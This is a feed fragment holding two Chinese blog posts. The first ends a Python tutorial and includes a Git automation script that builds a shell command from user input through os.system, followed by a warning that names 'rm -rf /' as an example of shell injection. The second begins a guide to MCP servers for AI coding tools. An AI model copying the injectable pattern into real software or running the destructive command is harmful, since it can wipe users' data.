print(\"文件读取操作结束。\")\n</code></pre>\n<p>在上述代码中，<code>try</code>语句块中的代码会尝试执行，如果出现<code>FileNotFoundError</code>异常，则会跳转到<code>except</code>语句块中执行相应的错误处理逻辑。无论是否发生异常，<code>finally</code>语句块中的代码都会被执行，通常用于清理资源或记录日志。</p>\n</li>\n<li>\n<p><code>yield</code>语句：该语句的作用是用于定义生成器函数，它可以在函数执行过程中暂停并返回一个值，等待下一次调用时继续执行。生成器函数通常被用来处理大量数据或无限序列。例如，如果我们希望创建一个生成器函数来逐行读取文件内容，可以像下面这样做：</p>\n<pre><code class=\"language-python\">def read_lines(file_path):\n    with open(file_path, \"r\") as file:\n        for line in file:\n            yield line.strip()  # 使用 yield 返回每一行内容\n</code></pre>\n<p>在使用该生成器函数时，我们可以像下面这样逐行读取文件内容：</p>\n<pre><code class=\"language-python\">    for line in read_lines(\"example.txt\"):\n        print(line)\n</code></pre>\n</li>\n<li>\n<p><code>assert</code>语句：该语句的作用是用于在程序运行时检查某个条件是否成立，如果不成立，则会抛出一个<code>AssertionError</code>异常。它通常被用来进行调试和测试。例如，如果我们希望在读取文本时确保每一行都不是空行，就可以像下面这样做：</p>\n<pre><code class=\"language-python\">num = 1\nwhile line := readLine(text):\n    assert line != \"\", \"读取到空行，程序终止。\"\n    print(f\"{num}. {line}\")\n    num = num + 1\nelse:\n    print(f\"读取完毕，共读取了 {num - 1} 行文本。\")\n</code></pre>\n</li>\n</ul>\n<h2 id=\"标准库的使用\">标准库的使用</h2>\n<p>除了掌握基本语法之外，程序员的编程能力实际上是取决于他如何根据自己面对的问题找到适用的程序库（包括框架），并在合理的时间内掌握它们的使用方法，并用它快速地构建自己的项目。在 Python 语言中，我们可以使用的程序库（与框架）通常可以被分为两大类：一类是由 Python 官方提供的标准库；另一类则是由程序员自己或特定第三方开发的扩展库。下面，让我们先来具体介绍一下标准库的使用方法。</p>\n<p>标准库是 Python 运行时环境的一部分，通常会随着该运行时环境一同被安装到我们的计算机设备中。Python 官方提供的标准库非常庞大，涉及的范围也十分广泛，其中包含了多个内置模块 (以 C 编写)，程序员们必须依靠它们来实现系统级的功能（例如文件的输入输出），此外还有大量以 Python 编写的模块，提供了日常编程中许多问题的标准解决方案。下面，我们来列举一些在实际开发中常常会用到标准库模块。</p>\n<ul>\n<li><code>sys</code>模块：该模块主要用于访问和修改系统相关信息，例如查看当前使用的 Python 版本、系统环境变量、模块信息和 Python 解释器相关信息等。</li>\n<li><code>os</code>模块：该模块主要用于支持执行操作系统相关的操作，它提供了访问操作系统底层 API 的方式。例如，调用可执行输入输出、文件读写、读取异常错误信息、进程线程管理、文件管理、调度程序等操作的 API。</li>\n<li><code>re</code>模块：该模块主要用于支持正则表达式操作。通常情况下，在面对大量字符串处理需求的时候，使用正则表达式是最快速有效的方式。</li>\n<li><code>math</code>模块：该模块主要用于支持数学运算，它提供了对 C 语言标准定义的数学函数访问。例如，实现数论的各种表示方法、幂和对数函数、三角函数、常量圆周率和自然常数等。</li>\n<li><code>random</code>模块：该模块主要用于生成伪随机数，可以模拟现实世界中随机取数、随机抽奖等。需要注意的是，真实的随机数原本是通过物理过程实践得出结论，而伪随机数则是通过计算机的特定算法生成的数，所以后者是可预测的、有规律的，只是循环周期较长，并不能与现实场景相切合。</li>\n<li><code>logging</code>模块：该模块是主要用于支持执行与日志记录相关的工作，它提供了对应用程序和库函数的日志记录，日常开发中我们经常需要通过日志打印出当前程序的运行状态，实时查看可能出现的堆栈异常和错误信息。</li>\n<li><code>json</code>模块：该模块主要用于支持 JSON 数据的编码和解码。在日常开发中，我们经常需要在程序的前后端之间传输 JSON 格式的数据，并对其进行序列化和反序列化操作，而序列化和反序列化本质上就是编码和解码的工作。</li>\n<li><code>socket</code>模块：该模块主要用于执行与底层网络相关的操作，它提供了 BSD 标准的 Socket API，可以通过访问底层操作系统 Socket 的相关接口进行网络通讯。</li>\n<li><code>urllib</code>模块：该模块主要用于执行与 URL（统一资源定位符）处理相关的操作，其中集成了用于向指定 URL 发送请求并处理其响应数据的各种函数。</li>\n<li><code>threading</code>模块：该模块主要用于执行与多线程并行相关的操作，针对多线程并发的问题可以给数据加同步锁，一次只能让一个线程处理数据，从而避免出现数据读写混乱。在 CPython 解释器上，因为 GIL（全局解释器锁）锁机制的存在的，被设计成线程安全，所以同一时间只能执行一个线程，这就导致了多线程不能发挥出计算机的多核特性。</li>\n<li><code>multiprocessing</code>模块：该模块主要用于执行与多进程并行相关的操作，它的功能与<code>threading</code>模块很类似，不同的是进程库可以创建子进程避开 GIL，从而弥补线程库存在的劣势和发挥计算机的多核特性。</li>\n<li><code>asyncio</code>模块：这是一个支持用<code>async/await</code>关键字编写并发操作的模块，它为多个异步框架提供基础功能，能够帮助程序员们实现高性能的网络、Web 服务器、数据库连接和分布式任务队列等。</li>\n<li><code>copy</code>模块：该模块主要用于执行与浅层、深层复制相关的操作。我们都知道要制作对象副本，是无法通过简单值传递创建新变量的方式做到，因为新变量所指向的内存空间依旧是原对象本身，所以对新变量进行任何操作都会改变原对象。那么， <code>copy</code>模块就提供了制作对象副本的各种方法，会开辟一个新的内存空间存放副本对象，修改操作不会对原对象有任何干预。</li>\n<li><code>profile</code>、<code>pstats</code>模块：这两个模块主要用于执行与性能分析相关的操作。其中，<code>profile</code>模块提供了<code>profile</code>和<code>cProfile</code>两种不同实现的性能分析工具，可用来描述程序各个部分的执行时间和频率，统计后的信息可以通过<code>pstats</code>模块保存并使用。</li>\n<li><code>unittest</code>模块：该模块主要用于执行与单元测试相关的操作，它在设计上受到 JUnit 和其他主流测试库的启发，因此在使用方式方面与它们有着相似的风格。</li>\n</ul>\n<p>在 Python 语言中，使用标准库的方式是非常简单且直观的，大体上只需要执行两个步骤即可。下面，让我们借助一个使用<code>threading</code>模块的示例来为读者演示一下这两个步骤。具体做法是在之前创建的<code>say_hello</code>项目的根目录创建一个名为的<code>example_threading.py</code>文件，并在其中输入如下代码：</p>\n<pre><code class=\"language-python\"># 第一步：使用 import 语句在当前作用域中导入要使用的模块：\nimport threading\nimport time\n# 如果只需要导入 time 模块中的 sleep 函数，\n# 也可以使用 from ... import 语句，例如：\n# from time import sleep \n\n# 第二步：根据官方文档中的说明，根据自己的需要来调用模块提供的方法：\ndef loop():\n    print('thread %s is running...' % threading.current_thread().name)\n    n = 0\n    while (n &lt; 5):\n        n = n + 1\n        print('thread %s &gt;&gt;&gt; %s' % (threading.current_thread().name, n))\n        time.sleep(1) # 等待 1 秒\n        # 如果之前是使用 from ... import 语句导入的 sleep 函数，\n        # 这里就只需调用 sleep(1) 即可\n\n    print('thread %s ended.' % threading.current_thread().name)\n\nprint('thread %s is running...' % threading.current_thread().name)\nt = threading.Thread(target=loop, name='LoopThread')\nt.start()\nt.join()\nprint('thread %s ended.' % threading.current_thread().name)\n</code></pre>\n<p>在保存了上述代码之后，我们就可以在终端中运行<code>python example_threading.py</code>命令来执行它。如果一切顺利，我们将会看到类似下面的输出：</p>\n<pre><code class=\"language-python\">thread MainThread is running...\nthread LoopThread is running...\nthread LoopThread &gt;&gt;&gt; 1\nthread LoopThread &gt;&gt;&gt; 2\nthread LoopThread &gt;&gt;&gt; 3\nthread LoopThread &gt;&gt;&gt; 4\nthread LoopThread &gt;&gt;&gt; 5\nthread LoopThread ended.\nthread MainThread ended.\n</code></pre>\n<p>正如读者所见，使用标准库的步骤非常简单，第一步是使用<code>import</code>语句将需要使用的模块导入到当前作用域中；第二步则是根据 Python 标准库的文档来选择要调用的方法，用于实现自己的需求。关于这方面的信息，读者可以前往Python 官方的<a href=\"https://docs.python.org/3/library/index.html\" rel=\"noopener nofollow\" target=\"_blank\">线上文档</a>来查阅。需要注意的是，Python 的标准库是非常庞大的，包含了大量的模块和函数，因此在实际开发中，我们通常只会使用其中的一小部分。为了更好地掌握标准库的使用方法，建议读者在编写代码时多参考官方文档，并结合实际需求进行学习和实践。</p>\n<h2 id=\"学习成果验收\">学习成果验收</h2>\n<p>现在，我们就基本介绍完了 Python 这门编程语言的基本语法规则。如果想要使用这门语言完成各种具体应用的开发工作，掌握它的基本语法规则及其标准库的使用方法无疑是先决条件。虽然在这个系列的后续笔记中，我会假设读者已经满足了这一先决条件，但对于“掌握”程度，我们还是希望先和读者约定以下标准。首先，读者需要掌握的是 Python 语言的标准语法，包括灵活运用各种表达式语句、条件语句、循环语句，以及会使用标准库提供的各种数据类型和数据结构，掌握这一能力的标准是能理解下面代码中实现的各种排序算法，并能正确地调用它们：</p>\n<pre><code class=\"language-python\">import random\n\n# 线性搜索\ndef linear_search(arr, target):  \n    for i in range(len(arr)):\n        if arr[i] == target:\n            return i\n    return -1\n\n# 二分搜索\ndef binary_search(arr, target):\n    left, right = 0, len(arr) - 1\n    while left &lt;= right:\n        mid = (left + right) // 2\n        if arr[mid] == target:\n            return mid\n        elif arr[mid] &lt; target:\n            left = mid + 1\n        else:\n            right = mid - 1\n    return -1\n\n# 选择排序\ndef selection_sort(arr):\n    n = len(arr)\n    for i in range(n - 1):\n        min_idx = i\n        for j in range(i + 1, n):\n            if arr[j] &lt; arr[min_idx]:\n                min_idx = j\n        arr[i], arr[min_idx] = arr[min_idx], arr[i]\n    return arr\n\n# 快速排序\ndef quick_sort(arr):\n    if len(arr) &lt;= 1:\n        return arr\n    pivot = arr[0]\n    left = [x for x in arr[1:] if x &lt; pivot]\n    right = [x for x in arr[1:] if x &gt;= pivot]\n    return quick_sort(left) + [pivot] + quick_sort(right)\n</code></pre>\n<p>最后，在最理想的情况下，读者还应该具备一些能基于标准库来编写自动化脚本的能力，例如能理解并复述下面这段实现 Git 提交操作的自动化脚本。</p>\n<pre><code class=\"language-python\"># -*- coding: utf-8 -*-\n\"\"\"\n本脚本适用于在 Linux 或 macOS 系统上自动化执行 Git 提交操作，\nWindows 用户可以自行调整一下脚本中执行的命令。\n使用方法：将脚本保存为 git_commit.py，并在终端中运行 python git_commit.py &lt;git_dir&gt; [commit_message]\n其中 &lt;git_dir&gt; 是 Git 仓库的路径，commit_message 是可选的提交信息。\n\"\"\"\n\nimport os\nimport sys\nimport time\n\nif not len(sys.argv) in range(2, 4):\n    print(\"Usage: git_commit.py &lt;git_dir&gt; [commit_message]\") \n    exit(1)\n\ntitle = \"=    Starting \" + sys.argv[0] + \"......    =\"\nn = len(title)\nprint(n*'=')\nprint(title)\nprint(n*'=')\n\nos.chdir(sys.argv[1])\nprint(\"work_dir: \" + sys.argv[1])\nif len(sys.argv) == 3 and sys.argv[2] != \"\":\n    commit_message = sys.argv[2]\nelse:\n    commit_message = \"committed at \" + time.strftime(\"%Y-%m-%d\",time.localtime(time.time()))\n\nos.system(\"git add .\")\nos.system(\"git commit -m '\"+ commit_message + \"'\")\n\nprint(\"Commit is complete!\")\n\nprint(n*'=')    \nprint(\"=     Done!\" + (n-len(\"=     Done!\")-1)*' ' + \"=\")\nprint(n*'=')\n</code></pre>\n<p>需要说明的是，由于我们在这里为了让上述示例显得浅显易懂一些，选择了用<code>os</code>标准库模块中的<code>system()</code>方法来执行脚本的外部命令，但这会带来诸如 shell 注入之类的安全风险（例如恶意执行<code>rm -rf /</code>这样的命令）。因此在实际开发中，我们更推荐使用<code>subprocess</code>这个标准库模块来执行脚本的外部命令，虽然使用起来会更复杂一些，但它会让脚本的执行更安全，也能更好处理与用户的交互。</p>\n<p>如果读者在基于以上标准的自我检验中遇到了一些不可回避的问题，我们会强烈建议先回过头去补习一下 Python 语言的基础知识，例如去阅读一下我在《[[关于Python的学习|Python 的学习路线图]]》一文中推荐的基础教材，等达到了我们在这里约定的对基础知识的“掌握”标准，再继续学习后面的内容，以便实现最好的学习效果。</p>\n<h2 id=\"小结\">小结</h2>\n<p>在这篇笔记中，我们首先介绍了 Python 语言的基本语法规则，包括变量、数据类型、表达式语句、条件语句、循环语句、函数、模块、类和异常处理等。接着，我们介绍了 Python 标准库的使用方法，并给出了一个使用标准库实现多线程的示例。最后，我们给出了学习成果验收的标准，并希望读者能根据这个标准来检验自己的学习成果。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n        <p class=\"postfoot\">\n            posted on \n<span id=\"post-date\">2026-01-20 11:34</span>&nbsp;\n<a href=\"https://www.cnblogs.com/owlman\">凌杰</a>&nbsp;\n阅读(<span id=\"post_view_count\">29</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n\n        </p>"
    },
    {
      "title": "20 个神级 AI 编程扩展，爽爆了！",
      "link": "https://www.cnblogs.com/yupi/p/19505500",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/yupi/p/19505500\" id=\"cb_post_title_url\" title=\"发布于 2026-01-20 11:06\">\n    <span>20 个神级 AI 编程扩展，爽爆了！</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        <img alt=\"20 个神级 AI 编程扩展，爽爆了！\" class=\"desc_img\" src=\"https://img2024.cnblogs.com/blog/2225420/202601/2225420-20260120103446751-1400381560.png\" />\n        欢迎在评论区分享你在用的 AI 编程工具，一起进步吧！\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p class=\"md-end-block md-p md-focus\"><span class=\"md-plain md-expand\">大家好，我是程序员鱼皮。给大家分享一些我自己在用的 AI 编程扩展，帮你大幅提高 AI 编程效率和代码质量。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><strong>万字长文 + 100 多张图</strong><span class=\"md-plain\">，绝对干货！点个收藏，让我们开始吧~</span></span></p>\n<blockquote>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">本文已收录到 <span class=\"md-meta-i-c  md-link\"><a href=\"https://ai.codefather.cn/\" rel=\"noopener nofollow\"><span class=\"md-plain\">鱼皮 AI 导航的《免费 Vibe Coding 教程》</span></a><span class=\"md-plain\"> 中，可以在这里免费获取更多 AI 资源。</span></span></span></p>\n</blockquote>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h2 class=\"md-end-block md-heading\"><span class=\"md-plain\">一、MCP 服务器类</span></h2>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">MCP 的全称是 Model Context Protocol 模型上下文协议。简单来说，就是让 AI 大模型能够连接外部工具和数据源的一个开放标准。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">打个比方，MCP 就像是 AI 的 USB-C 接口，原本 AI 只能根据训练数据来回答问题、生成代码，但有了这个统一接口，它就能连接各种外部工具，比如打开浏览器看网站、搜索并抓取网页内容、部署项目到云端、访问数据库等等，能力一下子就丰富起来了。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">⭐️ Firecrawl MCP 网页内容抓取</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">首先要介绍的是 <span class=\"md-meta-i-c  md-link\"><a href=\"https://www.firecrawl.dev/\" rel=\"noopener nofollow\"><span class=\"md-plain\">Firecrawl MCP</span></a><span class=\"md-plain\">，让 AI 能够自动抓取和理解网页内容。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">我在开发项目时经常需要从网上获取参考资料、阅读官方文档和技术博客，或者分析竞品的功能实现。如果人工来做这件事，需要先打开网站、再手动复制粘贴内容，或者自己写个爬虫脚本，麻烦得一批。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">有了 Firecrawl MCP，这事儿就简单多了。我直接在 AI 编程工具中跟 AI 说：</span></p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">帮我获取这个网站的内容</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">帮我读一下这个文档</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">帮我从网上搜索 XX 相关的信息</span></p>\n</li>\n</ul>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">它就能自动把网页的内容、结构、甚至是动态加载的数据都给我抓下来。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><strong>如何使用？</strong></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">首先你需要在 <span class=\"md-meta-i-c  md-link\"><a href=\"https://www.firecrawl.dev/app/api-keys\" rel=\"noopener nofollow\"><span class=\"md-plain\">Firecrawl 官网</span></a><span class=\"md-plain\"> 注册账号，并创建一个调用服务的 API Key。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">然后进入到 AI 编程工具中配置一下 MCP 服务器。这里我以 Cursor 为例，其他 AI 编程工具对接 MCP 的方法可以看各自的官方文档，比如 <span class=\"md-meta-i-c  md-link\"><a href=\"https://docs.anthropic.com/en/docs/claude-code/mcp\" rel=\"noopener nofollow\"><span class=\"md-plain\">Claude Code 接入 MCP 文档</span></a><span class=\"md-plain\">。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">打开 Cursor 设置，找到 Tools &amp; MCP，点击 <span class=\"md-pair-s\"><code>+ New MCP Server</code><span class=\"md-plain\">。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">本质上就是修改 MCP 配置文件，添加这样的配置：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>{<br /><span>&nbsp;<span class=\"cm-string cm-property\">\"mcpServers\": {<br /><span>&nbsp; &nbsp;<span class=\"cm-string cm-property\">\"firecrawl-mcp\": {<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"command\":&nbsp;<span class=\"cm-string\">\"npx\",<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"args\": [<span class=\"cm-string\">\"-y\",&nbsp;<span class=\"cm-string\">\"firecrawl-mcp\"],<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"env\": {<br /><span>&nbsp; &nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"FIRECRAWL_API_KEY\":&nbsp;<span class=\"cm-string\">\"你的API密钥\"<br /><span>&nbsp; &nbsp; }<br /><span>&nbsp; }<br /><span>}<br /><span>}</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">这段配置的意思是：通过 npx 命令来运行 firecrawl-mcp 这个工具，并且把你的 API 密钥传给它。如果你电脑上还没有安装 npx，需要先 <span class=\"md-meta-i-c  md-link\"><a href=\"https://nodejs.org/zh-cn\" rel=\"noopener nofollow\"><span class=\"md-plain\">到官网安装 Node.js</span></a><span class=\"md-plain\">，npx 会随着 Node.js 一起安装。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">配置好之后，看到绿色的成功点点，表示能够正常使用了。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">除了基础的网页抓取，Firecrawl MCP 还支持批量抓取整站内容、递归抓取网站的多层链接、失败自动重试等高级功能。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">Brave Search MCP 隐私搜索</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">接下来是 <span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/brave/brave-search-mcp-server\" rel=\"noopener nofollow\"><span class=\"md-plain\">Brave Search MCP</span></a><span class=\"md-plain\">，让 AI 能够进行注重隐私保护的网络搜索。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在开发过程中，我经常需要让 AI 帮我搜索最新的技术资料、查找某个库的使用示例、或者了解某个技术问题的解决方案。传统的做法是自己去搜索引擎查，然后把结果复制给 AI，比较麻烦。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">有了 Brave Search MCP，我直接跟 AI 说：</span></p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">帮我搜索一下 React 19 的新特性</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">查一下这个错误怎么解决</span></p>\n</li>\n</ul>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">它就能通过 Brave 搜索引擎去找答案。而且 Brave 搜索不会追踪你的搜索记录，隐私保护做得很好。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s \"><strong>如何使用？</strong></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">首先去 <span class=\"md-meta-i-c  md-link\"><a href=\"https://brave.com/search/api/\" rel=\"noopener nofollow\"><span class=\"md-plain\">Brave Search API</span></a><span class=\"md-plain\"> 注册账号，然后进入 API Key 管理页面，首先要选择一个订阅计划。必须选择免费版啊！每月有 2000 次查询额度，对于个人开发来说够用了。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">但这里比较坑的一点是，即使订阅免费版，也要填写付款方式，没有海外银行卡的朋友可以撤了。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">订阅成功后，创建 API Key：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">拿到 API Key 后，在 Cursor 的 MCP 配置中添加：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>{<br /><span>&nbsp;<span class=\"cm-string cm-property\">\"mcpServers\": {<br /><span>&nbsp; &nbsp;<span class=\"cm-string cm-property\">\"brave-search\": {<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"command\":&nbsp;<span class=\"cm-string\">\"npx\",<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"args\": [<span class=\"cm-string\">\"-y\",&nbsp;<span class=\"cm-string\">\"brave-search-mcp\"],<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"env\": {<br /><span>&nbsp; &nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"BRAVE_API_KEY\":&nbsp;<span class=\"cm-string\">\"你的API密钥\"<br /><span>&nbsp; &nbsp; }<br /><span>&nbsp; }<br /><span>}<br /><span>}</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">配置好后，AI 就能随时帮你搜索最新信息了。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">支持网页、图片、视频、新闻等多种类型的内容搜索，甚至能搜索本地商家信息（比如附近的咖啡店）。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">它还带有 AI 摘要功能，能把搜索结果自动总结成简洁的答案。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">⭐️ Context7 获取最新文档</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://context7.com/\" rel=\"noopener nofollow\"><span class=\"md-plain\">Context7</span></a><span class=\"md-plain\"> 能帮 AI 获取到最新的技术文档。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">我们都知道，AI 的训练数据是有截止时间的，比如 GPT-4 的知识可能只更新到 2023 年。这就导致一个问题，当你问 AI 关于某个框架最新版本的用法时，它给出的答案可能是过时的。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">Context7 就是来解决这个问题的。它会自动从官方文档网站抓取最新的、特定版本的文档内容，然后提供给 AI。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">这样一来，AI 给出的代码示例和建议就是基于最新文档的，不会去用已经废弃的写法，大大提高了项目能正常运行的概率。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s \"><strong>如何使用？</strong></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">访问 <span class=\"md-meta-i-c  md-link\"><a href=\"https://context7.com/dashboard\" rel=\"noopener nofollow\"><span class=\"md-plain\">Context7 Dashboard</span></a><span class=\"md-plain\"> 注册账号并获取 API Key，个人使用是免费的。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">然后在 MCP 配置中添加：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>{<br /><span>&nbsp;<span class=\"cm-string cm-property\">\"mcpServers\": {<br /><span>&nbsp; &nbsp;<span class=\"cm-string cm-property\">\"context7\": {<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"url\":&nbsp;<span class=\"cm-string\">\"https://mcp.context7.com/mcp\",<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"headers\": {<br /><span>&nbsp; &nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"CONTEXT7_API_KEY\":&nbsp;<span class=\"cm-string\">\"你的API密钥\"<br /><span>&nbsp; &nbsp; }<br /><span>&nbsp; }<br /><span>}<br /><span>}</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">之后你在 AI 编程工具中跟 AI 对话时，只要跟技术文档相关，或者主动提一嘴 \"use context7\"，它就会自动去获取最新文档来回复你。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">Web to MCP 复刻网页组件</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://web-to-mcp.com/\" rel=\"noopener nofollow\"><span class=\"md-plain\">Web to MCP</span></a><span class=\"md-plain\"> 是一个 Chrome 扩展，搭配 MCP 使用，能把网页上的任何 UI 组件直接发送给 AI，让 AI 生成对应的代码，用最快的速度抄作业！</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">很多时候，我在浏览网站时看到一个不错的 UI 组件，想让 AI 帮我实现类似的效果。以前的做法是截图，然后跟 AI 描述：“帮我做一个类似这样的按钮，圆角、渐变色、带阴影……” 既费时又不准确。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">有了 Web to MCP，我只需要在网页上点击某个想复刻的元素：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">它就会自动捕获组件的 DOM 结构、CSS 样式、甚至是交互效果，并且给你一个让 AI 复刻组件的提示词。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">你只需要把提示词发送给 AI，AI 会调用 MCP 拿到完整的组件信息，并生成代码来复刻组件。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">相比于直接给 AI 模糊的截图，生成的代码更准确了。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s \"><strong>如何使用？</strong></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">1）通过官网或者在 Chrome 应用商店搜索 Web to MCP 来安装扩展</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">2）用 Google 账号登录，获取你的 MCP 配置：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">3）在 AI 编程工具的 MCP 配置中添加：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>{<br /><span>&nbsp;<span class=\"cm-string 